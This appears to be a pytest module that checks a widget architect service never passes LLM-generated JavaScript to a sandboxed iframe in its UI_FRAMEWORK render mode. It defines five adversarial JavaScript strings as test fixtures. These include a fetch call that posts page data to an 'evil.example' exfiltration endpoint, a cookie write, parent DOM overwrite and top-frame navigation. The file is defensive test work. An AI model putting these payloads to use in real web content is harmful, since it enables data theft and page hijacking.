"""T304 — Adversarial WidgetSpec fixtures for US3 sandbox validation.

This module documents the 5 adversarial JavaScript patterns (A1-A5) that
the sandbox iframe's CSP and sandbox flags must block. Each pattern is also
tested against the architect_service to confirm that:

  1. UI_FRAMEWORK render mode always produces code=None (never executes JS).
  2. The `WidgetSpec.code` field is reserved for FREE_CODE mode (T129-T131,
     deferred). Until FREE_CODE is enabled, no WidgetSpec reaching the iframe
     will carry executable code from the LLM.

The actual runtime isolation (CSP + sandbox) is validated by E2E tests in
frontend/e2e/widget-isolation.spec.ts and widget-timeout.spec.ts.
"""

from __future__ import annotations

import pytest

from app.models.extraction import ColumnDescriptor, DataExtraction, QueryPlan, SourceType
from app.models.render_mode import UILibrary
from app.models.widget import WidgetRenderMode, WidgetType
from app.services.widget.architect_service import ArchitectRequest, build_widget

# ─── Adversarial JS patterns (documented for reference) ──────────────────────

#: A1 — Attempt to overwrite host document DOM via parent reference.
#: Blocked by sandbox opaque origin (no allow-same-origin).
ADVERSARIAL_A1_PARENT_DOM = "parent.document.body.innerHTML = 'PWNED';"

#: A2 — Attempt to navigate the host page via window.top.
#: Blocked by sandbox (no allow-top-navigation).
ADVERSARIAL_A2_TOP_NAVIGATION = "window.top.location.href = 'https://evil.example/';"

#: A3 — Attempt to read/write host cookies.
#: Blocked by opaque origin — document.cookie returns '' and writes are ignored.
ADVERSARIAL_A3_COOKIE_THEFT = "document.cookie = 'stolen=1; path=/; SameSite=None';"

#: A4 — Attempt to exfiltrate data via fetch to external domain.
#: Blocked by CSP connect-src 'none'.
ADVERSARIAL_A4_EXTERNAL_FETCH = (
    "fetch('https://evil.example/exfil', {method:'POST', body: JSON.stringify(window.data)});"
)

#: A5 — Alert/popup abuse, modal injection.
#: Blocked by sandbox (no allow-popups, no allow-modals).
ADVERSARIAL_A5_MODAL_ABUSE = "alert('XSS'); window.open('https://evil.example/', '_blank');"

ALL_ADVERSARIAL_PATTERNS: list[tuple[str, str]] = [
    ("A1_parent_dom", ADVERSARIAL_A1_PARENT_DOM),
    ("A2_top_navigation", ADVERSARIAL_A2_TOP_NAVIGATION),
    ("A3_cookie_theft", ADVERSARIAL_A3_COOKIE_THEFT),
    ("A4_external_fetch", ADVERSARIAL_A4_EXTERNAL_FETCH),
    ("A5_modal_abuse", ADVERSARIAL_A5_MODAL_ABUSE),
]


# ─── Fixture helpers ──────────────────────────────────────────────────────────


def _make_extraction(*, num_rows: int = 10) -> DataExtraction:
    return DataExtraction(
        session_id="adversarial-test-session",
        connection_id="adversarial-conn",
        source_type=SourceType.SQL_SQLITE,
        query_plan=QueryPlan(
            language="sql",
            expression="SELECT region, SUM(amount) AS total FROM sales GROUP BY region",
        ),
        columns=[
            ColumnDescriptor(name="region", type="string"),
            ColumnDescriptor(name="total", type="float"),
        ],
        rows=[{"region": f"R{i}", "total": float(i * 100)} for i in range(num_rows)],
        row_count=num_rows,
        truncated=False,
        status="success",
    )


# ─── T304 tests ───────────────────────────────────────────────────────────────


@pytest.mark.asyncio
@pytest.mark.parametrize("label,js_code", ALL_ADVERSARIAL_PATTERNS)
async def test_ui_framework_spec_never_carries_code(label: str, js_code: str) -> None:
    """UI_FRAMEWORK WidgetSpecs always have code=None regardless of JS content.

    In UI_FRAMEWORK mode the renderer is a React component bundled into the
    widget-runtime; the `code` field is only meaningful for FREE_CODE mode.
    This test confirms the invariant so that adversarial JS in `code.js` can
    never reach the iframe via the current production path.
    """
    extraction = _make_extraction()
    request = ArchitectRequest(
        extraction=extraction,
        render_mode=WidgetRenderMode.UI_FRAMEWORK,
        ui_library=UILibrary.SHADCN,
        user_intent="show regional sales",
    )
    outcome = await build_widget(request)
    assert outcome.spec is not None, "Architect must produce a spec for valid extraction"
    assert outcome.spec.code is None, (
        f"UI_FRAMEWORK spec must not carry executable code (pattern {label}). "
        "Adversarial JS would only execute in FREE_CODE mode."
    )


def test_all_adversarial_patterns_are_documented() -> None:
    """Guard that all 5 adversarial patterns from the quickstart spec are present."""
    assert len(ALL_ADVERSARIAL_PATTERNS) == 5
    labels = {label for label, _ in ALL_ADVERSARIAL_PATTERNS}
    assert "A1_parent_dom" in labels
    assert "A2_top_navigation" in labels
    assert "A3_cookie_theft" in labels
    assert "A4_external_fetch" in labels
    assert "A5_modal_abuse" in labels


@pytest.mark.asyncio
@pytest.mark.parametrize("widget_type", list(WidgetType))
async def test_ui_framework_spec_code_is_null_for_all_widget_types(widget_type: WidgetType) -> None:
    """No native WidgetType in UI_FRAMEWORK mode should produce a code payload."""
    extraction = _make_extraction()
    request = ArchitectRequest(
        extraction=extraction,
        render_mode=WidgetRenderMode.UI_FRAMEWORK,
        ui_library=UILibrary.SHADCN,
        preferred_widget_type=widget_type,
    )
    outcome = await build_widget(request)
    if outcome.spec is not None:
        assert outcome.spec.code is None, (
            f"WidgetType.{widget_type.value} should not generate code in UI_FRAMEWORK mode"
        )
